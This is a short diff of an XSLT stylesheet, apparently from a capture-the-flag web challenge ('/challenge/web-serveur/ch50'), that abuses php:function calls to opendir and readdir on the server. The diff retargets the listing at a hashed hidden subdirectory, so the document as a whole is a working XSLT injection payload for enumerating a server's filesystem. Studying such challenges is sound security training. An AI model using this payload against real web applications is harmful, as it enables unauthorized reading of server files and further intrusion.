@@ -6,7 +6,7 @@
 	<xsl:output method="html"/>
 	
   <xsl:template match="/">
-	<xsl:value-of select="php:function('opendir', '/challenge/web-serveur/ch50')"/>
+	<xsl:value-of select="php:function('opendir', '/challenge/web-serveur/ch50/6ff3200bee785801f420fba826ffcdee')"/>
 	<xsl:value-of select="php:function('readdir')"/> <br/>
 	<xsl:value-of select="php:function('readdir')"/> <br/>
 	<xsl:value-of select="php:function('readdir')"/> <br/>
